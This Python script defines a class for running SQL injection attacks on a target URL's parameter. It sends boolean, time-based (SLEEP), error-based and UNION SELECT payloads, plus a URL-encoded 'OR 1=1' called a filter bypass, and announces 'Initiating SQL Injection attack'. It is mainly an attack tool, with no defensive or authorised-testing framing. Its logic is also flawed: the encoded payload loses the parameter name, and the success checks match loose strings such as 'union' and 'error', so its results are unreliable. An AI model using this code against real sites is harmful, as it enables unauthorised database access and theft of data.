import requests
import time
import random
import string
import urllib.parse

class SQLInjectionAdvanced:
    def __init__(self, target_url, vulnerable_param, headers=None):
        self.target_url = target_url
        self.vulnerable_param = vulnerable_param
        self.headers = headers if headers else {'User-Agent': 'Mozilla/5.0'}

    def generate_payload(self, payload):
        """
        Generate payload for SQL injection.
        """
        return f"{self.vulnerable_param}={payload}"

    def blind_sql_injection(self, payload):
        """
        Perform Blind SQL Injection attack (no error messages).
        """
        url = f"{self.target_url}?{payload}"
        
        try:
            response = requests.get(url, headers=self.headers)
            if "success" in response.text:  # Customize based on target's response
                print(f"Blind SQL Injection successful with payload: {payload}")
                return True
        except requests.exceptions.RequestException as e:
            print(f"Error during Blind SQL Injection: {e}")
        return False

    def time_based_blind_sql_injection(self, payload):
        """
        Perform Time-based Blind SQL Injection attack.
        """
        url = f"{self.target_url}?{payload}"
        start_time = time.time()
        
        try:
            response = requests.get(url, headers=self.headers)
            end_time = time.time()
            response_time = end_time - start_time
            if response_time > 5:  # Customize based on expected delay
                print(f"Time-based Blind SQL Injection successful with payload: {payload}")
                return True
        except requests.exceptions.RequestException as e:
            print(f"Error during Time-based Blind SQL Injection: {e}")
        return False

    def error_based_sql_injection(self, payload):
        """
        Perform Error-based SQL Injection attack (based on error messages).
        """
        url = f"{self.target_url}?{payload}"
        
        try:
            response = requests.get(url, headers=self.headers)
            if "SQL syntax" in response.text or "error" in response.text:  # Customize based on error
                print(f"Error-based SQL Injection successful with payload: {payload}")
                return True
        except requests.exceptions.RequestException as e:
            print(f"Error during Error-based SQL Injection: {e}")
        return False

    def union_based_sql_injection(self, payload):
        """
        Perform Union-based SQL Injection attack to extract data.
        """
        url = f"{self.target_url}?{payload}"
        
        try:
            response = requests.get(url, headers=self.headers)
            if "union" in response.text:  # Customize based on target response
                print(f"Union-based SQL Injection successful with payload: {payload}")
                return True
        except requests.exceptions.RequestException as e:
            print(f"Error during Union-based SQL Injection: {e}")
        return False

    def bypass_filter(self, payload):
        """
        Try bypassing filters by encoding or obfuscating SQL injection payloads.
        """
        encoded_payload = urllib.parse.quote(payload)
        return encoded_payload

    def execute_sql_injection(self):
        """
        Execute various SQL injection techniques on the target.
        """
        print(f"Initiating SQL Injection attack on {self.target_url}")

        # Test Blind SQL Injection
        blind_payload = self.generate_payload("' AND 1=1 --")
        if self.blind_sql_injection(blind_payload):
            print("Blind SQL Injection successful!")

        # Test Time-based Blind SQL Injection
        time_based_payload = self.generate_payload("' OR IF(1=1, SLEEP(5), 0) --")
        if self.time_based_blind_sql_injection(time_based_payload):
            print("Time-based Blind SQL Injection successful!")

        # Test Error-based SQL Injection
        error_based_payload = self.generate_payload("' AND 1=1 --")
        if self.error_based_sql_injection(error_based_payload):
            print("Error-based SQL Injection successful!")

        # Test Union-based SQL Injection
        union_based_payload = self.generate_payload("' UNION SELECT NULL, NULL, NULL --")
        if self.union_based_sql_injection(union_based_payload):
            print("Union-based SQL Injection successful!")

        # Test Bypass Filter (encoded payload)
        encoded_payload = self.bypass_filter("' OR 1=1 --")
        if self.error_based_sql_injection(encoded_payload):
            print("Bypassed filter successfully with encoded payload!")
